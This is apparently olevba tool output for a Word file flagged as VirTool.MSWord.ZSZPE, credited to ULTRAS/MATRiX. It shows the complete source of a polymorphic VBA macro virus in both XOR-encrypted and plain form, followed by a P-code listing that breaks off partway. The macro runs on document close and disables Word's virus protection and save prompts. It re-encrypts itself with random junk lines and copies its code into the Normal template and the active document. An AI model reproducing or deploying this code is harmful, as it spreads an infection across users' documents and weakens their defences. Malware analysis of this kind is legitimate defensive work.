olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: VirTool.MSWord.ZSZPE
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: VirTool.MSWord.ZSZPE - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Encrypt a virus:
' ~~~~~~~~~~~~~~~~

Private Sub Document_Close()
Options.SaveNormalPrompt = False
Application.EnableCancelKey = wdCancelDisabled
On Error Resume Next    ' ìóñîð
For ZSZPE1 = 34 To 106
Application.ActiveWindow.Activate
ZSZPE2 = Null
Options.CreateBackup = True
ZSZPE3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(ZSZPE1, 1))
Options.CreateBackup = True
ZSZPE4 = Asc((Mid(ZSZPE3, 2, 1)))
Options.SaveNormalPrompt = False
ZSZPE5 = ZSZPE4 Xor 39
Randomize
For ZSZPE6 = 3 To Len(ZSZPE3)
Options.SaveNormalPrompt = False
ZSZPE7 = Asc(Mid(ZSZPE3, ZSZPE6, 1)) Xor ZSZPE5
Options.InsertedTextColor = wdAuto
ZSZPE2 = ZSZPE2 & Chr(ZSZPE7)
Options.SaveNormalPrompt = False
Next ZSZPE6
Randomize
ZSZPE8 = ZSZPE2
If VT = 39 Then JY = 2
ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine ZSZPE1, ZSZPE8
Options.BackgroundSave = True
Next ZSZPE1
If NT = 21 Then BO = 13
Call ZSZPE
Application.ActiveWindow.Activate
End Sub
'Zd0B SHi ZduB p0LyM0RHiC ENGiNe By ULTRAS/MATRiX
Private Sub ZSZPE()
' Hwsnhit)DubfsbEfdlrw':'Surb
'&Gns!y{!<!3!Un!017!Rudq!3
'"Juqljkv+Fw`dq`Gdfnpu%8%Qwp`
'/f}e(5(Af| Zfl("(1!(#(9
'#Ktpmkjw*Mjwavpa`Pa|pGkhkv$9$s`Eqpk
'!O`&hsk&;&7&Rnch&|ik"&;&$Tghbiko|c$
'"Juqljkv+Lkv`wq`aQ`}qFjijw%8%raDpqj
'"Lc%kph%8%7%Qm`k%jh!%8%'Dfqls`Ajfph`kq+Vds`'
'#Etthmgepmkj*EgpmraSmj`ks*Egpmrepa
'$Je#mvn#>#0#Wkfm#yln'#>#!Lswjlmp-@qfbwfAb`hvs#>#Wqvf!
'#Ktpmkjw*Fegocvkqj`Wera$9$Pvqa
'$Je#mvn#>#7#Wkfm#yln'#>#!Je#!#%#@kq+Jmw+Qmg#)#16*#(#56*#%#@kq+Jmw+Qmg#)#16*#(#56*#%#!#>#!#%#@Pwq+Jmw+Qmg#)#76**#%#!Wkfm#!#%#@kq+Jmw+Qmg#)#16*#(#56*#%#@kq+Jmw+Qmg#)#16*#(#56*#%#!#>#!#%#@Pwq+Jmw+Qmg#)#76**
'&Nquhnor/C`bjfsntoeR`wd!<!Ustd
'%Kd"lwo"?"7"Vjgl"xmo&"?" Ml"Gppmp"Pgqwog"Lgzv
'/Gx|agf{&Kzmi|mJikc}x(5(\z}m
'&Hg!otl!<!7!Uido!{nl%!<!#@qqmhb`uhno/@buhwdVhoenv/@buhw`ud#
'#Ktpmkjw*WeraJkviehTvkitp$9$Behwa
'$Je#mvn#>#4#Wkfm#yln'#>#!Lswjlmp-PbufMlqnboSqlnsw#>#Ebopf!
'#Ktpmkjw*Fegocvkqj`Wera$9$Pvqa
'%Kd"lwo"?":"Vjgl"xmo&"?" Mrvkmlq,KlqgpvgfVgzvAmnmp"?"ufCwvm
'#Ktpmkjw*GvaepaFegoqt$9$Pvqa
'$Je#mvn#>#:#Wkfm#yln'#>#!Lswjlmp-Ab`hdqlvmgPbuf#>#Wqvf!
'!Ih&Cttit&Tcuskc&Hc~r
'"QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+W`uidf`Ilk`%})%jh!
'%Pclfmokxg
'/Fmp|(pr
'!Ivroihu(DgematishbUgpc&;&Rtsc
'"QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+W`uidf`Ilk`%67)%'"_a5G%VMl%_apG%u5I|H5WMlF%@KBlK`%G|%PIQWDV*HDQWl]'
'#Ktpmkjw*WeraJkviehTvkitp$9$Behwa
'&Gns![R[QD0!<!25!Un!017
' Ufichjn}b
'#^W^TA6$9$Jqhh
' Fwwkndfsnhi)FdsnqbPnichp)Fdsnqfsb
'"_V_U@6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-_V_U@4)%4,,
' Ufichjn}b
'&[R[QD5!<!Hou)Soe)(!+!9(!*!0
'%Pclfmokxg
'&Gns![R[QD4!<!0!Un!Mdo)[R[QD2(
'&Nquhnor/HordsudeUdyuBnmns!<!ve@tun
'$YPYSF5#>#Bp`+Njg+YPYSF0/#YPYSF6/#2**#[lq#YPYSF7
'%Mrvkmlq,Apgcvg@caiwr"?"Vpwg
'&[R[QD3!<![R[QD3!'!Bis)[R[QD7(
'"Wdkajhl`
'!Hc~r&\U\VC3
'"Juqljkv+Fw`dq`Gdfnpu%8%Qwp`
' ]T]WB0':']T]WB5
'&Hg!IY!<!03!Uido!XJ!<!6
'%VjkqFmawoglv,T@Rpmhgav,T@Amormlglvq,Kvgo*3+,AmfgOmfwng,PgrncagNklg"XQXRG3." % "$"XQXRG5
'!GeropcBieskchr(Ugpc
'#Ja|p$^W^TA5
'$Bssoj`bwjlm-B`wjufTjmglt-B`wjubwf
'%Mrvkmlq,TkpwqRpmvgavkml"?"Dcnqg
'!O`&MT&;&?&Rnch&OV&;&>
'/Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m
'"Duuilfdqljk+Dfqls`Rlkajr+Dfqlsdq`
'&Nquhnor/BnoghslBnowdsrhnor!<!G`mrd
' Ufichjn}b
'#P@$9$Plmw@kgqiajp*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha*Hmjaw,5($Plmw@kgqiajp*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha*GkqjpKbHmjaw-
'#Kj$Avvkv$Vawqia$Ja|p
'#Wap$JP$9$JkviehPaithepa*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha
'%Mrvkmlq,@caiepmwlfQctg"?"Vpwg
'$MW-GfofwfOjmfp#2/#MW-@lvmwLeOjmfp
'&Nquhnor/Bsd`udC`bjtq!<!Ustd
'"KQ+DaaCwjhVqwlkb%QA
'%Mrvkmlq,KlqgpvgfVgzvAmnmp"?"ufCwvm
'/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm
'&Hg!IV!<!08!Uido!QQ!<!5
'#RE*@ahapaHmjaw$5($RE*GkqjpKbHmjaw
'$Bssoj`bwjlm-B`wjufTjmglt-B`wjubwf
' QF)FccAuhjTsuni`'SC
' Hwsnhit)TfqbIhujfkWuhjws':'Afktb
'$B`wjufGl`vnfmw-PbufBp#EjofMbnf9>B`wjufGl`vnfmw-EvooMbnf
'!Ivroihu(DgematishbUgpc&;&Rtsc
End Sub


'Not Encrypt a virus:
'~~~~~~~~~~~~~~~~~~~~
 
Private Sub Document_Close()

Application.EnableCancelKey = wdCancelDisabled

For ZSZPE1 = 34 To 106

ZSZPE2 = Null

ZSZPE3 = (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(ZSZPE1, 1))

ZSZPE4 = Asc((Mid(ZSZPE3, 2, 1)))

ZSZPE5 = ZSZPE4 Xor 39

For ZSZPE6 = 3 To Len(ZSZPE3)

ZSZPE7 = Asc(Mid(ZSZPE3, ZSZPE6, 1)) Xor ZSZPE5

ZSZPE2 = ZSZPE2 & Chr(ZSZPE7)

Next ZSZPE6

ZSZPE8 = ZSZPE2

ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine ZSZPE1, ZSZPE8

Next ZSZPE1

Call ZSZPE

End Sub

Private Sub ZSZPE()

For xz = 2 To 106 Step 2

num = Int(Rnd * 9) + 1

If num = 1 Then zom$ = "Randomize"

If num = 2 Then zom$ = "ActiveDocument.Save"

If num = 3 Then zom$ = "Options.CreateBackup = True"

If num = 4 Then zom$ = "If " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45)) & "Then " & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & " = " & CStr(Int(Rnd * 45))

If num = 5 Then zom$ = "On Error Resume Next"

If num = 6 Then zom$ = "Application.ActiveWindow.Activate"

If num = 7 Then zom$ = "Options.SaveNormalPrompt = False"

If num = 8 Then zom$ = "Options.InsertedTextColor = wdAuto"

If num = 9 Then zom$ = "Options.BackgroundSave = True"

ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine xz, zom$

Next xz

ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine 32, "'Zd0B SHi ZduB p0LyM0RHiC ENGiNe By ULTRAS/MATRiX"

For ZSZPE1 = 34 To 106

ZSZPE2 = Null

ZSZPE3 = "'" & (ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(ZSZPE1, 1))

ZSZPE4 = Int(Rnd() * 8) + 1

For ZSZPE5 = 1 To Len(ZSZPE3)

ZSZPE6 = Asc(Mid(ZSZPE3, ZSZPE5, 1)) Xor ZSZPE4

ZSZPE2 = ZSZPE2 & Chr(ZSZPE6)

Next ZSZPE5

ZSZPE7 = ZSZPE2

ThisDocument.VBProject.VBComponents.Item(1).CodeModule.ReplaceLine ZSZPE1, "'" & ZSZPE7

Next ZSZPE1

Options.VirusProtection = False

Options.SaveNormalPrompt = False

Options.ConfirmConversions = False

TD = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

Set NT = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule

NT.DeleteLines 1, NT.CountOfLines

NT.AddFromString TD

Set VA = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule

VA.DeleteLines 1, VA.CountOfLines

VA.AddFromString TD

ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: VirTool.MSWord.ZSZPE
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 13680 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0011 " Encrypt a virus:"
' Line #1:
' 	QuoteRem 0x0000 0x0011 " ~~~~~~~~~~~~~~~~"
' Line #2:
' Line #3:
' 	FuncDefn (Private Sub Document_Close())
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #6:
' 	OnError (Resume Next) 
' 	QuoteRem 0x0018 0x0006 " ìóñîð"
' Line #7:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	LitDI2 0x0022 
' 	LitDI2 0x006A 
' 	For 
' Line #8:
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	ArgsMemCall Activate 0x0000 
' Line #9:
' 	LitVarSpecial (Null)
' 	St ZSZPE2 
' Line #10:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #11:
' 	Ld ZSZPE1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St ZSZPE3 
' Line #12:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt CreateBackup 
' Line #13:
' 	Ld ZSZPE3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	St ZSZPE4 
' Line #14:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #15:
' 	Ld ZSZPE4 
' 	LitDI2 0x0027 
' 	Xor 
' 	St ZSZPE5 
' Line #16:
' 	ArgsCall Read 0x0000 
' Line #17:
' 	StartForVariable 
' 	Ld ZSZPE6 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld ZSZPE3 
' 	FnLen 
' 	For 
' Line #18:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #19:
' 	Ld ZSZPE3 
' 	Ld ZSZPE6 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld ZSZPE5 
' 	Xor 
' 	St ZSZPE7 
' Line #20:
' 	Ld wdAuto 
' 	Ld Options 
' 	MemSt InsertedTextColor 
' Line #21:
' 	Ld ZSZPE2 
' 	Ld ZSZPE7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ZSZPE2 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #23:
' 	StartForVariable 
' 	Ld ZSZPE6 
' 	EndForVariable 
' 	NextVar 
' Line #24:
' 	ArgsCall Read 0x0000 
' Line #25:
' 	Ld ZSZPE2 
' 	St ZSZPE8 
' Line #26:
' 	Ld VT 
' 	LitDI2 0x0027 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0002 
' 	St JY 
' 	EndIf 
' Line #27:
' 	Ld ZSZPE1 
' 	Ld ZSZPE8 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #28:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt BackgroundSave 
' Line #29:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Ld NT 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000D 
' 	St BO 
' 	EndIf 
' Line #31:
' 	ArgsCall (Call) ZSZPE 0x0000 
' Line #32:
' 	Ld Application 
' 	MemLd ActiveWindow 
' 	ArgsMemCall Activate 0x0000 
' Line #33:
' 	EndSub 
' Line #34:
' 	QuoteRem 0x0000 0x0030 "Zd0B SHi ZduB p0LyM0RHiC ENGiNe By ULTRAS/MATRiX"
' Line #35:
' 	FuncDefn (Private Sub ZSZPE())
' Line #36:
' 	QuoteRem 0x0000 0x001C " Hwsnhit)DubfsbEfdlrw':'Surb"
' Line #37:
' 	QuoteRem 0x0000 0x0019 "&Gns!y{!<!3!Un!017!Rudq!3"
' Line #38:
' 	QuoteRem 0x0000 0x001C ""Juqljkv+Fw`dq`Gdfnpu%8%Qwp`"
' Line #39:
' 	QuoteRem 0x0000 0x0017 "/f}e(5(Af| Zfl("(1!(#(9"
' Line #40:
' 	QuoteRem 0x0000 0x0023 "#Ktpmkjw*Mjwavpa`Pa|pGkhkv$9$s`Eqpk"
' Line #41:
' 	QuoteRem 0x0000 0x0023 "!O`&hsk&;&7&Rnch&|ik"&;&$Tghbiko|c$"
' Line #42:
' 	QuoteRem 0x0000 0x0023 ""Juqljkv+Lkv`wq`aQ`}qFjijw%8%raDpqj"
' Line #43:
' 	QuoteRem 0x0000 0x002D ""Lc%kph%8%7%Qm`k%jh!%8%'Dfqls`Ajfph`kq+Vds`'"
' Line #44:
' 	QuoteRem 0x0000 0x0022 "#Etthmgepmkj*EgpmraSmj`ks*Egpmrepa"
' Line #45:
' 	QuoteRem 0x0000 0x0035 "$Je#mvn#>#0#Wkfm#yln'#>#!Lswjlmp-@qfbwfAb`hvs#>#Wqvf!"
' Line #46:
' 	QuoteRem 0x0000 0x001E "#Ktpmkjw*Fegocvkqj`Wera$9$Pvqa"
' Line #47:
' 	QuoteRem 0x0000 0x00CB "$Je#mvn#>#7#Wkfm#yln'#>#!Je#!#%#@kq+Jmw+Qmg#)#16*#(#56*#%#@kq+Jmw+Qmg#)#16*#(#56*#%#!#>#!#%#@Pwq+Jmw+Qmg#)#76**#%#!Wkfm#!#%#@kq+Jmw+Qmg#)#16*#(#56*#%#@kq+Jmw+Qmg#)#16*#(#56*#%#!#>#!#%#@Pwq+Jmw+Qmg#)#76**"
' Line #48:
' 	QuoteRem 0x0000 0x001E "&Nquhnor/C`bjfsntoeR`wd!<!Ustd"
' Line #49:
' 	QuoteRem 0x0000 0x002D "%Kd"lwo"?"7"Vjgl"xmo&"?" Ml"Gppmp"Pgqwog"Lgzv"
' Line #50:
' 	QuoteRem 0x0000 0x001C "/Gx|agf{&Kzmi|mJikc}x(5(\z}m"
' Line #51:
' 	QuoteRem 0x0000 0x003B "&Hg!otl!<!7!Uido!{nl%!<!#@qqmhb`uhno/@buhwdVhoenv/@buhw`ud#"
' Line #52:
' 	QuoteRem 0x0000 0x0021 "#Ktpmkjw*WeraJkviehTvkitp$9$Behwa"
' Line #53:
' 	QuoteRem 0x0000 0x003A "$Je#mvn#>#4#Wkfm#yln'#>#!Lswjlmp-PbufMlqnboSqlnsw#>#Ebopf!"
' Line #54:
' 	QuoteRem 0x0000 0x001E "#Ktpmkjw*Fegocvkqj`Wera$9$Pvqa"
' Line #55:
' 	QuoteRem 0x0000 0x003B "%Kd"lwo"?":"Vjgl"xmo&"?" Mrvkmlq,KlqgpvgfVgzvAmnmp"?"ufCwvm"
' Line #56:
' 	QuoteRem 0x0000 0x001C "#Ktpmkjw*GvaepaFegoqt$9$Pvqa"
' Line #57:
' 	QuoteRem 0x0000 0x0037 "$Je#mvn#>#:#Wkfm#yln'#>#!Lswjlmp-Ab`hdqlvmgPbuf#>#Wqvf!"
' Line #58:
' 	QuoteRem 0x0000 0x0015 "!Ih&Cttit&Tcuskc&Hc~r"
' Line #59:
' 	QuoteRem 0x0000 0x004C ""QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+W`uidf`Ilk`%})%jh!"
' Line #60:
' 	QuoteRem 0x0000 0x000A "%Pclfmokxg"
' Line #61:
' 	QuoteRem 0x0000 0x0008 "/Fmp|(pr"
' Line #62:
' 	QuoteRem 0x0000 0x001E "!Ivroihu(DgematishbUgpc&;&Rtsc"
' Line #63:
' 	QuoteRem 0x0000 0x007B ""QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+W`uidf`Ilk`%67)%'"_a5G%VMl%_apG%u5I|H5WMlF%@KBlK`%G|%PIQWDV*HDQWl]'"
' Line #64:
' 	QuoteRem 0x0000 0x0021 "#Ktpmkjw*WeraJkviehTvkitp$9$Behwa"
' Line #65:
' 	QuoteRem 0x0000 0x0017 "&Gns![R[QD0!<!25!Un!017"
' Line #66:
' 	QuoteRem 0x0000 0x000A " Ufichjn}b"
' Line #67:
' 	QuoteRem 0x0000 0x000E "#^W^TA6$9$Jqhh"
' Line #68:
' 	QuoteRem 0x0000 0x0022 " Fwwkndfsnhi)FdsnqbPnichp)Fdsnqfsb"
' Line #69:
' 	QuoteRem 0x0000 0x0059 ""_V_U@6%8%'"'%#%-QmlvAjfph`kq+SGUwjo`fq+SGFjhujk`kqv+Lq`h-4,+Fja`Hjapi`+Ilk`v-_V_U@4)%4,,"
' Line #70:
' 	QuoteRem 0x0000 0x000A " Ufichjn}b"
' Line #71:
' 	QuoteRem 0x0000 0x001C "&[R[QD5!<!Hou)Soe)(!+!9(!*!0"
' Line #72:
' 	QuoteRem 0x0000 0x000A "%Pclfmokxg"
' Line #73:
' 	QuoteRem 0x0000 0x001E "&Gns![R[QD4!<!0!Un!Mdo)[R[QD2("
' Line #74:
' 	QuoteRem 0x0000 0x0023 "&Nquhnor/HordsudeUdyuBnmns!<!ve@tun"
' Line #75:
' 	QuoteRem 0x0000 0x0030 "$YPYSF5#>#Bp`+Njg+YPYSF0/#YPYSF6/#2**#[lq#YPYSF7"
' Line #76:
' 	QuoteRem 0x0000 0x001C "%Mrvkmlq,Apgcvg@caiwr"?"Vpwg"
' Line #77:
' 	QuoteRem 0x0000 0x001E "&[R[QD3!<![R[QD3!'!Bis)[R[QD7("
' Line #78:
' 	QuoteRem 0x0000 0x000A ""Wdkajhl`"
' Line #79:
' 	QuoteRem 0x0000 0x000C "!Hc~r&\U\VC3"
' Line #80:
' 	QuoteRem 0x0000 0x001C ""Juqljkv+Fw`dq`Gdfnpu%8%Qwp`"
' Line #81:
' 	QuoteRem 0x0000 0x0010 " ]T]WB0':']T]WB5"
' Line #82:
' 	QuoteRem 0x0000 0x0017 "&Hg!IY!<!03!Uido!XJ!<!6"
' Line #83:
' 	QuoteRem 0x0000 0x0058 "%VjkqFmawoglv,T@Rpmhgav,T@Amormlglvq,Kvgo*3+,AmfgOmfwng,PgrncagNklg"XQXRG3." % "$"XQXRG5"
' Line #84:
' 	QuoteRem 0x0000 0x0014 "!GeropcBieskchr(Ugpc"
' Line #85:
' 	QuoteRem 0x0000 0x000C "#Ja|p$^W^TA5"
' Line #86:
' 	QuoteRem 0x0000 0x0022 "$Bssoj`bwjlm-B`wjufTjmglt-B`wjubwf"
' Line #87:
' 	QuoteRem 0x0000 0x0020 "%Mrvkmlq,TkpwqRpmvgavkml"?"Dcnqg"
' Line #88:
' 	QuoteRem 0x0000 0x0016 "!O`&MT&;&?&Rnch&OV&;&>"
' Line #89:
' 	QuoteRem 0x0000 0x0021 "/Gx|agf{&[i~mFgzeidXzgex|(5(Nid{m"
' Line #90:
' 	QuoteRem 0x0000 0x0022 ""Duuilfdqljk+Dfqls`Rlkajr+Dfqlsdq`"
' Line #91:
' 	QuoteRem 0x0000 0x0023 "&Nquhnor/BnoghslBnowdsrhnor!<!G`mrd"
' Line #92:
' 	QuoteRem 0x0000 0x000A " Ufichjn}b"
' Line #93:
' 	QuoteRem 0x0000 0x008A "#P@$9$Plmw@kgqiajp*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha*Hmjaw,5($Plmw@kgqiajp*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha*GkqjpKbHmjaw-"
' Line #94:
' 	QuoteRem 0x0000 0x0015 "#Kj$Avvkv$Vawqia$Ja|p"
' Line #95:
' 	QuoteRem 0x0000 0x0042 "#Wap$JP$9$JkviehPaithepa*RFTvknagp*RFGkitkjajpw*Mpai,5-*Gk`aIk`qha"
' Line #96:
' 	QuoteRem 0x0000 0x001E "%Mrvkmlq,@caiepmwlfQctg"?"Vpwg"
' Line #97:
' 	QuoteRem 0x0000 0x0022 "$MW-GfofwfOjmfp#2/#MW-@lvmwLeOjmfp"
' Line #98:
' 	QuoteRem 0x0000 0x001C "&Nquhnor/Bsd`udC`bjtq!<!Ustd"
' Line #99:
' 	QuoteRem 0x0000 0x0014 ""KQ+DaaCwjhVqwlkb%QA"
' Line #100:
' 	QuoteRem 0x0000 0x0023 "%Mrvkmlq,KlqgpvgfVgzvAmnmp"?"ufCwvm"
' Line #101:
' 	QuoteRem 0x0000 0x0042 "/[m|(^I(5(Ik|a~mLgk}emf|&^JXzgbmk|&^JKgexgfmf|{&A|me 9!&KglmEgl}dm"
' Line #102:
' 	QuoteRem 0x0000 0x0017 "&Hg!IV!<!08!Uido!QQ!<!5"
' Line #103:
' 	QuoteRem 0x0000 0x0022 "#RE*@ahapaHmjaw$5($RE*GkqjpKbHmjaw"
' Line #104:
' 	QuoteRem 0x0000 0x0022 "$Bssoj`bwjlm-B`wjufTjmglt-B`wjubwf"
' Line #105:
' 	QuoteRem 0x0000 0x0014 " QF)FccAuhjTsuni`'SC"
' Line #106:
' 	QuoteRem 0x0000 0x0021 " Hwsnhit)TfqbIhujfkWuhjws':'Afktb"
' Line #107:
' 	QuoteRem 0x0000 0x0038 "$B`wjufGl`vnfmw-PbufBp#EjofMbnf9>B`wjufGl`vnfmw-EvooMbnf"
' Line #108:
' 	QuoteRem 0x0000 0x001E "!Ivroihu(DgematishbUgpc&;&Rtsc"
' Line #109:
' 	EndSub 
' Line #110:
' Line #111:
' Line #112:
' 	QuoteRem 0x0000 0x0014 "Not Encrypt a virus:"
' Line #113:
' 	QuoteRem 0x0000 0x0014 "~~~~~~~~~~~~~~~~~~~~"
' Line #114:
' Line #115:
' 	FuncDefn (Private Sub Document_Close())
' Line #116:
' Line #117:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #118:
' Line #119:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	LitDI2 0x0022 
' 	LitDI2 0x006A 
' 	For 
' Line #120:
' Line #121:
' 	LitVarSpecial (Null)
' 	St ZSZPE2 
' Line #122:
' Line #123:
' 	Ld ZSZPE1 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Paren 
' 	St ZSZPE3 
' Line #124:
' Line #125:
' 	Ld ZSZPE3 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Paren 
' 	ArgsLd Asc 0x0001 
' 	St ZSZPE4 
' Line #126:
' Line #127:
' 	Ld ZSZPE4 
' 	LitDI2 0x0027 
' 	Xor 
' 	St ZSZPE5 
' Line #128:
' Line #129:
' 	StartForVariable 
' 	Ld ZSZPE6 
' 	EndForVariable 
' 	LitDI2 0x0003 
' 	Ld ZSZPE3 
' 	FnLen 
' 	For 
' Line #130:
' Line #131:
' 	Ld ZSZPE3 
' 	Ld ZSZPE6 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Ld ZSZPE5 
' 	Xor 
' 	St ZSZPE7 
' Line #132:
' Line #133:
' 	Ld ZSZPE2 
' 	Ld ZSZPE7 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St ZSZPE2 
' Line #134:
' Line #135:
' 	StartForVariable 
' 	Ld ZSZPE6 
' 	EndForVariable 
' 	NextVar 
' Line #136:
' Line #137:
' 	Ld ZSZPE2 
' 	St ZSZPE8 
' Line #138:
' Line #139:
' 	Ld ZSZPE1 
' 	Ld ZSZPE8 
' 	LitDI2 0x0001 
' 	Ld ThisDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall ReplaceLine 0x0002 
' Line #140:
' Line #141:
' 	StartForVariable 
' 	Ld ZSZPE1 
' 	EndForVariable 
' 	NextVar 
' Line #142:
' Line #143:
' 	ArgsCall (Call) ZSZPE 0x0000 
' Line #144:
' Line #145:
' 	EndSub 
' Line #146:
' Line #147:
' 	FuncDefn (Private Sub ZSZPE())
' Line #148:
' Line #149:
' 	StartForVariable 
' 	Ld xz 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	LitDI2 0x006A 
' 	LitDI2 0x0002 
' 	ForStep 
' Line #150:
' Line #151:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St num 
' Line #152:
' Line #153:
' 	Ld num 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0009 "Randomize"
' 	St zom$ 
' 	EndIf 
' Line #154:
' Line #155:
' 	Ld num 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0013 "ActiveDocument.Save"
' 	St zom$ 
' 	EndIf 
' Line #156:
' Line #157:
' 	Ld num 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x001B "Options.CreateBackup = True"
' 	St zom$ 
' 	EndIf 
' Line #158:
' Line #159:
' 	Ld num 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0003 "If "
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x002D 
' 	Mul 
' 	FnInt 
' 	Coerce (Str) 
' 	Concat 
' 	LitStr 0x0005 "Then "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0019 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0041 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0003 " = "
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x002D 
' 	Mul 
' 	FnInt 
' 	Coerce (Str) 
' 	Concat 
' 	St zom$ 
' 	EndIf 
' Line #160:
' Line #161:
' 	Ld num 
